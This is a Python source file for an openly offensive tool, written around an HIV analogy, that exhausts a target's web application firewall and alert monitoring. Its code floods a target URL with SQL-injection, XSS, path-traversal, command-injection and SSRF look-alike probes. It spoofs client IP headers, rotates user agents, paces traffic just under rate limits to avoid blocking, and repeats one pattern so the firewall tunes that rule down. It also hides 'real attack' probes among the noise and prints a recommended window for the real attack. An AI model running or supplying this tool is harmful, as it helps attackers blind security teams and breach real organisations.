#!/usr/bin/env python3
"""
hiv_cd4_flood.py — CD4 Attack: WAF/SIEM Exhaustion Tool

HIV Analogy:
    HIV specifically targets and destroys CD4+ T-cells — the very immune cells
    responsible for coordinating the body's defence. As CD4 counts drop below
    critical thresholds (200 cells/μL = AIDS), the immune system loses its
    ability to respond to threats that it would normally neutralise.

    This tool implements the same strategy against a target's security
    infrastructure (WAF/SIEM/SOC):

    - Alert Flood Mode = Destroys WAF analyst capacity (CD4 depletion),
      overwhelming the SIEM with false positives until analysts either
      tune out the alerts or disable overactive rules.

    - Signature Aging Attack = Repeated exposure to a SPECIFIC signature
      causes the WAF/IDS to auto-tune its own rules, eventually disabling
      or reducing sensitivity to that exact pattern (immune tolerance).

    - Threshold Gaming = Stay just below the auto-block rate limit, like
      HIV maintaining a low but persistent viral load to avoid triggering
      full immune activation.

    - Noise + Real Attack Mix = Like HIV hiding among normal CD4+ T-cell
      populations, real attack probes are camouflaged in the noise of
      legitimate-looking false positives.

    The end state: a depleted 'CD4 count' (analyst bandwidth / active WAF
    rules) that creates a window for the real attack campaign to proceed
    undetected.

Usage:
    python hiv_cd4_flood.py --target URL --threads 20 --duration 3600 --real-attack-url URL2
"""

import argparse
import json
import os
import random
import sys
import threading
import time
import urllib.error
import urllib.parse
import urllib.request
from collections import defaultdict
from dataclasses import dataclass, field
from typing import List, Optional


# ---------------------------------------------------------------------------
# False Positive Payload Libraries
# ---------------------------------------------------------------------------

# Look-like SQLi but are benign strings
FAKE_SQLI_PROBES = [
    "' OR 1=1-- not_real",
    "' AND SLEEP(0)--",
    "UNION SELECT null,null,null--",
    "' ORDER BY 1--",
    "1; SELECT 1=1--",
    "'; SELECT pg_sleep(0)--",
    "\" OR \"\"=\"",
    "admin'--",
    "1 AND (SELECT 0)--",
    "'; WAITFOR DELAY '0:0:0'--",
    "' OR 'z'='z",
    "/**/UNION/**/SELECT/**/1--",
    "0x41424344",
    "' AND 1=2--",
    "' HAVING 1=1--",
    "' GROUP BY 1--",
]

# Look-like XSS but are benign
FAKE_XSS_PROBES = [
    "<script>console.log(1)</script>",
    "<img src=x onerror=void(0)>",
    "javascript:void(0)",
    "<svg>",
    "\" onmouseover=\"void(0)",
    "{{7*0}}",
    "${0}",
    "<%=0%>",
    "<ScRiPt>void(0)</ScRiPt>",
    "'\"><script><!--",
    "<body onload=void(0)>",
    "<iframe src=about:blank>",
    "data:text/html,<h1>test</h1>",
]

# Look-like LFI/Path traversal but are benign
FAKE_LFI_PROBES = [
    "../../../../etc/hosts",
    "../../../windows/win.ini",
    "....//....//etc/passwd",
    "%2e%2e%2f%2e%2e%2fetc%2fhosts",
    "..%252f..%252f..%252fetc%252fhosts",
    "php://filter/convert.base64-encode/resource=index",
    "/proc/self/status",
    "C:\\Windows\\win.ini",
    "file:///etc/hosts",
    "%00../../etc/hosts",
]

# Look-like RCE/Command injection but are benign
FAKE_RCE_PROBES = [
    "; echo 'test'",
    "| echo test",
    "` echo test`",
    "${IFS}echo${IFS}test",
    "; ping -c 0 127.0.0.1",
    "& timeout 0",
    "| type nul",
    "$(echo test)",
    ";sleep 0;",
    "| cat /dev/null",
    "1; ls /tmp --sort=none",
]

# Look-like SSRF but target benign/RFC-reserved addresses
FAKE_SSRF_PROBES = [
    "http://192.0.2.1/test",        # RFC 5737 test range
    "http://198.51.100.1/",         # RFC 5737 test range
    "http://203.0.113.1/",          # RFC 5737 test range
    "http://example.com/",           # IANA reserved
    "http://test.invalid/",
    "http://localhost.invalid/",
    "http://169.0.0.1/",            # Close to APIPA but different
    "dict://127.0.0.1:0/",
    "http://0.0.0.0:0/",
    "ftp://ftp.example.com/test",
]

# Legitimate-looking background traffic
LEGIT_NOISE = [
    "/",
    "/index.html",
    "/robots.txt",
    "/favicon.ico",
    "/sitemap.xml",
    "/api/health",
    "/api/v1/status",
    "/login",
    "/search?q=test",
    "/products",
    "/about",
    "/contact",
    "/css/main.css",
    "/js/app.js",
    "/images/logo.png",
]

# Rotating User-Agents
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
    "(KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_1) AppleWebKit/605.1.15 "
    "(KHTML, like Gecko) Version/17.1 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/119.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 "
    "(KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0",
    "curl/7.88.1",
    "python-requests/2.31.0",
    "Go-http-client/2.0",
    "okhttp/4.11.0",
    "Googlebot/2.1 (+http://www.google.com/bot.html)",
    "facebookexternalhit/1.1",
    "Twitterbot/1.0",
]

# Fake IPs for X-Forwarded-For rotation
FAKE_IP_RANGES = [
    # Simulated residential ranges
    "73.{}.{}.{}",
    "98.{}.{}.{}",
    "174.{}.{}.{}",
    "68.{}.{}.{}",
    # Mobile carrier ranges
    "172.{}.{}.{}",
    "100.{}.{}.{}",
    # Corporate-looking
    "10.{}.{}.{}",
    "192.168.{}.{}",
]


# ---------------------------------------------------------------------------
# Statistics Tracker
# ---------------------------------------------------------------------------
@dataclass
class FloodStats:
    """Thread-safe statistics accumulator."""
    total_requests: int = 0
    blocked: int = 0
    passed: int = 0
    errors: int = 0
    estimated_alerts: int = 0
    real_attack_requests: int = 0
    noise_requests: int = 0
    start_time: float = field(default_factory=time.time)
    _lock: threading.Lock = field(default_factory=threading.Lock)

    def record(self, status: int, is_real_attack: bool = False,
               is_noise: bool = False):
        with self._lock:
            self.total_requests += 1
            if status in (403, 406, 429, 503):
                self.blocked += 1
                self.estimated_alerts += 1
            elif status == 200:
                self.passed += 1
                if is_real_attack:
                    self.real_attack_requests += 1
            elif status == 0:
                self.errors += 1
            if is_noise:
                self.noise_requests += 1

    def elapsed(self) -> float:
        return time.time() - self.start_time

    def rps(self) -> float:
        e = self.elapsed()
        return self.total_requests / e if e > 0 else 0

    def to_dict(self) -> dict:
        elapsed = self.elapsed()
        return {
            'total_requests': self.total_requests,
            'blocked_by_waf': self.blocked,
            'passed_through': self.passed,
            'errors': self.errors,
            'estimated_alerts_generated': self.estimated_alerts,
            'real_attack_requests': self.real_attack_requests,
            'noise_requests': self.noise_requests,
            'duration_s': round(elapsed, 1),
            'avg_rps': round(self.rps(), 2),
            'noise_to_signal_ratio': (
                f"{self.noise_requests}:{max(1, self.real_attack_requests)}"
            ),
        }


# ---------------------------------------------------------------------------
# Payload Generator
# ---------------------------------------------------------------------------
class PayloadGenerator:
    """
    HIV Analogy — Viral Diversity (Quasispecies):
        HIV exists as a 'quasispecies' — a swarm of related but distinct
        viral variants generated by error-prone replication. PayloadGenerator
        creates the quasispecies swarm of probe variants — all derived from
        the same attack template but diverse enough that WAF signature matching
        cannot block ALL of them without disabling entire rule categories.
    """

    ALL_ATTACK_TYPES = [
        ('sqli', FAKE_SQLI_PROBES),
        ('xss', FAKE_XSS_PROBES),
        ('lfi', FAKE_LFI_PROBES),
        ('rce', FAKE_RCE_PROBES),
        ('ssrf', FAKE_SSRF_PROBES),
    ]

    def __init__(self, signature_aging_pattern: str = None):
        self.signature_aging_pattern = signature_aging_pattern

    def random_fake_payload(self) -> tuple:
        """Return (attack_type, payload) from false-positive pool."""
        attack_type, pool = random.choice(self.ALL_ATTACK_TYPES)
        return attack_type, random.choice(pool)

    def noise_path(self) -> str:
        """Return a legitimate-looking URL path."""
        return random.choice(LEGIT_NOISE)

    def signature_aging_variant(self) -> str:
        """Generate variants of the signature-aging target pattern."""
        if not self.signature_aging_pattern:
            return random.choice(FAKE_SQLI_PROBES)
        base = self.signature_aging_pattern
        transforms = [
            lambda s: s.upper(),
            lambda s: s.lower(),
            lambda s: s.replace(' ', '/**/'),
            lambda s: s.replace(' ', '%20'),
            lambda s: s.replace(' ', '\t'),
            lambda s: s.replace(' ', '%09'),
            lambda s: s + '--',
            lambda s: s + '#',
            lambda s: '/*hiv*/' + s,
            lambda s: s.replace("'", "\\'"),
            lambda s: urllib.parse.quote(s),
        ]
        transform = random.choice(transforms)
        return transform(base)


# ---------------------------------------------------------------------------
# Request Sender
# ---------------------------------------------------------------------------
class RequestSender:
    """
    HIV Analogy — Virion Budding:
        Each HIV virion that buds from the cell membrane is a discrete unit
        of attack capacity. RequestSender produces the individual 'virions'
        (HTTP requests) that constitute the flood.
    """

    def __init__(self, target: str, timeout: int = 8):
        self.target = target.rstrip('/')
        self.timeout = timeout

    def _random_ip(self) -> str:
        template = random.choice(FAKE_IP_RANGES)
        parts = template.count('{}')
        vals = [random.randint(1, 254) for _ in range(parts)]
        return template.format(*vals)

    def _build_headers(self) -> dict:
        return {
            'User-Agent': random.choice(USER_AGENTS),
            'Accept': random.choice([
                'text/html,application/xhtml+xml,*/*;q=0.9',
                'application/json',
                '*/*',
                'text/plain',
            ]),
            'Accept-Language': random.choice([
                'en-US,en;q=0.9',
                'en-GB,en;q=0.8',
                'fr-FR,fr;q=0.9',
                'de-DE,de;q=0.9',
            ]),
            'X-Forwarded-For': self._random_ip(),
            'X-Real-IP': self._random_ip(),
            'X-Originating-IP': self._random_ip(),
            'Referer': random.choice([
                'https://www.google.com/',
                'https://www.bing.com/',
                'https://duckduckgo.com/',
                '',
                self.target,
            ]),
        }

    def send(self, path: str, payload: str = None,
             param: str = 'q') -> tuple:
        """Send a single probe. Returns (status, elapsed)."""
        try:
            if payload:
                sep = '&' if '?' in path else '?'
                url = self.target + path + sep + urllib.parse.urlencode({param: payload})
            else:
                url = self.target + path

            headers = self._build_headers()
            req = urllib.request.Request(url)
            for k, v in headers.items():
                if v:
                    req.add_header(k, v)

            t0 = time.time()
            with urllib.request.urlopen(req, timeout=self.timeout) as resp:
                resp.read(512)  # consume body minimally
                return resp.status, time.time() - t0
        except urllib.error.HTTPError as e:
            return e.code, 0
        except Exception:
            return 0, 0


# ---------------------------------------------------------------------------
# Threshold Calculator
# ---------------------------------------------------------------------------
class ThresholdCalculator:
    """
    HIV Analogy — Viral Set Point:
        HIV establishes a 'viral set point' — a steady-state replication
        rate that balances viral growth against immune pressure without
        triggering full immune activation. ThresholdCalculator determines
        the 'set point' request rate that evades auto-blocking thresholds.
    """

    def __init__(self, max_requests: int, per_seconds: int):
        """
        Args:
            max_requests: Max requests allowed before alert (N)
            per_seconds: Time window in seconds (T)
        """
        self.max_requests = max_requests
        self.per_seconds = per_seconds

    def safe_rps(self, safety_margin: float = 0.80) -> float:
        """Return safe requests/second (just below threshold)."""
        return (self.max_requests / self.per_seconds) * safety_margin

    def sleep_between_requests(self) -> float:
        """Seconds to sleep between requests to stay under threshold."""
        rps = self.safe_rps()
        return 1.0 / rps if rps > 0 else 1.0

    def burst_safe(self, n_threads: int) -> float:
        """Per-thread sleep for N concurrent threads to stay under threshold."""
        rps = self.safe_rps()
        per_thread_rps = rps / n_threads
        return 1.0 / per_thread_rps if per_thread_rps > 0 else 1.0


# ---------------------------------------------------------------------------
# Worker Thread
# ---------------------------------------------------------------------------
def worker_thread(
    thread_id: int,
    target: str,
    real_attack_url: Optional[str],
    duration: float,
    stats: FloodStats,
    gen: PayloadGenerator,
    threshold_sleep: float,
    noise_ratio: float,
    stop_event: threading.Event,
    verbose: bool = False,
):
    """
    Single worker thread executing the flood campaign.

    HIV Analogy — Individual Virion:
        Each thread is an individual virion attempting to infect a new cell
        (send a probe to the target). Virions act independently in parallel,
        overwhelming the immune system (WAF/SIEM rate limiting) through
        sheer volume.
    """
    sender = RequestSender(target)
    real_sender = RequestSender(real_attack_url) if real_attack_url else None
    start = time.time()

    while not stop_event.is_set() and (time.time() - start) < duration:
        roll = random.random()

        # 95% noise probes, 5% real attack probes
        if roll < noise_ratio:
            # False positive flood probe
            is_noise_only = random.random() < 0.5
            if is_noise_only:
                # Pure legit-looking noise
                path = gen.noise_path()
                status, _ = sender.send(path)
                stats.record(status, is_noise=True)
            else:
                # False-positive attack signature
                attack_type, payload = gen.random_fake_payload()
                paths = ['/search', '/api/query', '/products', '/', '/login']
                path = random.choice(paths)
                status, _ = sender.send(path, payload=payload,
                                        param=random.choice(['q', 'id', 's', 'query', 'search']))
                stats.record(status, is_noise=True)
        else:
            # Real attack probe (5%)
            if real_sender:
                attack_type, payload = gen.random_fake_payload()
                status, _ = real_sender.send('/', payload=payload)
                stats.record(status, is_real_attack=True)
            else:
                # Signature aging variant
                payload = gen.signature_aging_variant()
                path = random.choice(['/search', '/api/query', '/'])
                status, _ = sender.send(path, payload=payload)
                stats.record(status)

        if verbose and stats.total_requests % 100 == 0:
            print(f"  [T{thread_id:02d}] Sent: {stats.total_requests} | "
                  f"RPS: {stats.rps():.1f} | "
                  f"Blocked: {stats.blocked}")

        time.sleep(threshold_sleep + random.uniform(0, threshold_sleep * 0.5))


# ---------------------------------------------------------------------------
# Signature Aging Campaign
# ---------------------------------------------------------------------------
def run_signature_aging(
    target: str,
    pattern: str,
    duration: float,
    threads: int,
    stats: FloodStats,
    stop_event: threading.Event,
    verbose: bool = False,
):
    """
    Signature aging attack: flood ONE specific pattern variant until WAF
    auto-tunes/disables that rule.

    HIV Analogy — Immune Tolerance Induction:
        Repeated low-level exposure to the same antigen can induce immune
        tolerance — the immune system learns to ignore the stimulus.
        Signature aging exploits the same principle: WAF vendors use
        feedback loops that reduce rule sensitivity when false-positive
        rates exceed a threshold for a specific pattern.
    """
    gen = PayloadGenerator(signature_aging_pattern=pattern)
    sender = RequestSender(target)
    start = time.time()
    variant_seen = defaultdict(int)

    print(f"\n  [AGING] Running signature aging on pattern: {pattern[:60]}")

    def _aging_worker():
        while not stop_event.is_set() and (time.time() - start) < duration:
            variant = gen.signature_aging_variant()
            variant_seen[variant] += 1
            status, _ = sender.send('/search', payload=variant)
            stats.record(status)
            time.sleep(random.uniform(0.05, 0.3))

    workers = [threading.Thread(target=_aging_worker, daemon=True)
               for _ in range(threads)]
    for w in workers:
        w.start()
    for w in workers:
        w.join()

    print(f"  [AGING] Generated {len(variant_seen)} unique variants of the pattern")
    return dict(sorted(variant_seen.items(), key=lambda x: -x[1])[:10])


# ---------------------------------------------------------------------------
# Main Flood Controller
# ---------------------------------------------------------------------------
class CD4Flood:
    """
    HIV Analogy — CD4+ T-Cell Depletion Campaign:
        HIV's primary pathogenic mechanism is the progressive depletion of
        CD4+ T-cells (the 'helper' immune cells that coordinate defence).
        Without sufficient CD4+ T-cells, the entire immune coordination
        collapses — the body can no longer respond to even trivial infections.

        CD4Flood depletes the target's security 'immune cells':
        - SOC analysts (overwhelmed with false positives, can't find real threats)
        - WAF alert budget (alert suppression kicks in, masking real attacks)
        - SIEM correlation rules (too many events → rule auto-disable or tuning)

        The end state: a depleted security posture where a real, targeted attack
        can proceed within the window of immune exhaustion.
    """

    def __init__(self, target: str, real_attack_url: Optional[str],
                 threads: int, duration: float,
                 threshold_n: int = 100, threshold_t: int = 60,
                 aging_pattern: str = None, noise_ratio: float = 0.95,
                 verbose: bool = False):
        self.target = target
        self.real_attack_url = real_attack_url
        self.threads = threads
        self.duration = duration
        self.aging_pattern = aging_pattern
        self.noise_ratio = noise_ratio
        self.verbose = verbose
        self.stats = FloodStats()
        self.stop_event = threading.Event()
        self.gen = PayloadGenerator(signature_aging_pattern=aging_pattern)
        self.threshold_calc = ThresholdCalculator(threshold_n, threshold_t)

    def run(self):
        safe_rps = self.threshold_calc.safe_rps()
        per_thread_sleep = self.threshold_calc.burst_safe(self.threads)

        print(f"\n[HIV-CD4-FLOOD] CD4 Depletion Campaign Starting")
        print("=" * 60)
        print(f"  Target             : {self.target}")
        print(f"  Real Attack URL    : {self.real_attack_url or '(same as target)'}")
        print(f"  Threads            : {self.threads}")
        print(f"  Duration           : {self.duration}s ({self.duration/60:.1f}m)")
        print(f"  Noise:Signal ratio : {int(self.noise_ratio*100)}:{int((1-self.noise_ratio)*100)}")
        print(f"  Safe RPS (below threshold): {safe_rps:.1f}")
        print(f"  Per-thread sleep   : {per_thread_sleep:.3f}s")
        print(f"  Aging pattern      : {self.aging_pattern or 'none'}")
        print("=" * 60)
        print("\n  [*] Launching worker threads...")

        # Launch worker threads
        workers = []
        for i in range(self.threads):
            t = threading.Thread(
                target=worker_thread,
                args=(
                    i, self.target, self.real_attack_url,
                    self.duration, self.stats, self.gen,
                    per_thread_sleep, self.noise_ratio,
                    self.stop_event, self.verbose,
                ),
                daemon=True,
            )
            workers.append(t)
            t.start()

        # Progress display
        try:
            start = time.time()
            while time.time() - start < self.duration:
                remaining = self.duration - (time.time() - start)
                elapsed = time.time() - start
                print(f"\r  Progress: {int(elapsed)}s/{int(self.duration)}s | "
                      f"Sent: {self.stats.total_requests:,} | "
                      f"RPS: {self.stats.rps():.1f} | "
                      f"Blocked: {self.stats.blocked:,} | "
                      f"ETA: {int(remaining)}s   ", end='', flush=True)
                time.sleep(2)
        except KeyboardInterrupt:
            print("\n  [!] Interrupted by user")
        finally:
            self.stop_event.set()

        print()

        # Wait for threads to finish
        for t in workers:
            t.join(timeout=5)

        # Run signature aging if pattern specified
        aging_results = {}
        if self.aging_pattern:
            self.stop_event.clear()
            aging_results = run_signature_aging(
                self.target, self.aging_pattern,
                min(300, self.duration * 0.2),
                max(2, self.threads // 4),
                self.stats, self.stop_event, self.verbose
            )
            self.stop_event.set()

        self._print_report(aging_results)

    def _attack_window_estimate(self) -> str:
        """Estimate optimal real attack window based on flood results."""
        elapsed = self.stats.elapsed()
        alert_rate = self.stats.estimated_alerts / elapsed if elapsed > 0 else 0

        if alert_rate > 10:
            return ("SIEM likely overwhelmed immediately — "
                    "attack window: NOW (during flood peak)")
        elif alert_rate > 2:
            return ("Moderate alert rate — attack window: "
                    "during flood (first 10 min likely highest noise)")
        elif self.stats.blocked > self.stats.total_requests * 0.5:
            return ("WAF actively blocking >50% — "
                    "attack window: AFTER flood (when WAF tunes down sensitivity)")
        else:
            return ("Low WAF activity detected — "
                    "target may have no/weak WAF; attack anytime")

    def _print_report(self, aging_results: dict):
        stats = self.stats.to_dict()
        attack_window = self._attack_window_estimate()

        print("\n" + "=" * 60)
        print("[HIV-CD4-FLOOD] Campaign Complete — Depletion Report")
        print("=" * 60)
        print(f"  Total requests sent          : {stats['total_requests']:,}")
        print(f"  Blocked by WAF               : {stats['blocked_by_waf']:,}")
        print(f"  Passed through               : {stats['passed_through']:,}")
        print(f"  Network errors               : {stats['errors']:,}")
        print(f"  Estimated SIEM alerts        : {stats['estimated_alerts_generated']:,}")
        print(f"  Real attack probes sent      : {stats['real_attack_requests']:,}")
        print(f"  Noise probes sent            : {stats['noise_requests']:,}")
        print(f"  Noise:Signal ratio           : {stats['noise_to_signal_ratio']}")
        print(f"  Duration                     : {stats['duration_s']}s")
        print(f"  Average RPS                  : {stats['avg_rps']}")
        print()
        print(f"  [RECOMMENDATION] {attack_window}")

        if aging_results:
            print(f"\n  [SIGNATURE AGING] Top 10 variants used:")
            for variant, count in list(aging_results.items())[:10]:
                print(f"    {count:4d}x  {variant[:70]}")

        # Save report
        report = {
            'target': self.target,
            'real_attack_url': self.real_attack_url,
            'stats': stats,
            'attack_window_recommendation': attack_window,
            'aging_variants': aging_results,
            'timestamp': time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
        }
        out_file = 'hiv_cd4_report.json'
        with open(out_file, 'w') as f:
            json.dump(report, f, indent=2)
        print(f"\n  Full report saved → {out_file}")
        print("=" * 60)


# ---------------------------------------------------------------------------
# CLI
# ---------------------------------------------------------------------------
def main():
    parser = argparse.ArgumentParser(
        description='HIV CD4 Flood — WAF/SIEM Exhaustion via False Positive Flood',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=__doc__
    )
    parser.add_argument('--target', required=True,
                        help='Primary target URL to flood')
    parser.add_argument('--threads', type=int, default=20,
                        help='Number of concurrent threads (default: 20)')
    parser.add_argument('--duration', type=int, default=3600,
                        help='Flood duration in seconds (default: 3600 = 1h)')
    parser.add_argument('--real-attack-url', dest='real_attack_url',
                        default=None,
                        help='URL for real attack probes (default: same as target)')
    parser.add_argument('--threshold-n', type=int, default=100,
                        help='WAF rate limit: N requests (default: 100)')
    parser.add_argument('--threshold-t', type=int, default=60,
                        help='WAF rate limit: per T seconds (default: 60)')
    parser.add_argument('--aging-pattern', default=None,
                        help="Signature aging: specific payload pattern to exhaust WAF rule")
    parser.add_argument('--noise-ratio', type=float, default=0.95,
                        help='Fraction of requests that are noise (default: 0.95 = 95%%)')
    parser.add_argument('--verbose', '-v', action='store_true',
                        help='Verbose per-thread output')
    parser.add_argument('--calc-threshold', action='store_true',
                        help='Calculate safe RPS for given N/T and exit')
    args = parser.parse_args()

    if args.calc_threshold:
        calc = ThresholdCalculator(args.threshold_n, args.threshold_t)
        print(f"\n[Threshold Calculator]")
        print(f"  WAF rate limit      : {args.threshold_n} req / {args.threshold_t}s")
        print(f"  Max RPS             : {args.threshold_n / args.threshold_t:.2f}")
        print(f"  Safe RPS (80%)      : {calc.safe_rps():.2f}")
        print(f"  Sleep/req (1 thread): {calc.sleep_between_requests():.3f}s")
        for n in [1, 5, 10, 20, 50]:
            print(f"  Sleep/req ({n:2d} threads): {calc.burst_safe(n):.3f}s")
        sys.exit(0)

    if args.noise_ratio < 0.5 or args.noise_ratio > 1.0:
        print("[ERROR] --noise-ratio must be between 0.5 and 1.0")
        sys.exit(1)

    flood = CD4Flood(
        target=args.target,
        real_attack_url=args.real_attack_url,
        threads=args.threads,
        duration=float(args.duration),
        threshold_n=args.threshold_n,
        threshold_t=args.threshold_t,
        aging_pattern=args.aging_pattern,
        noise_ratio=args.noise_ratio,
        verbose=args.verbose,
    )
    flood.run()


if __name__ == '__main__':
    main()
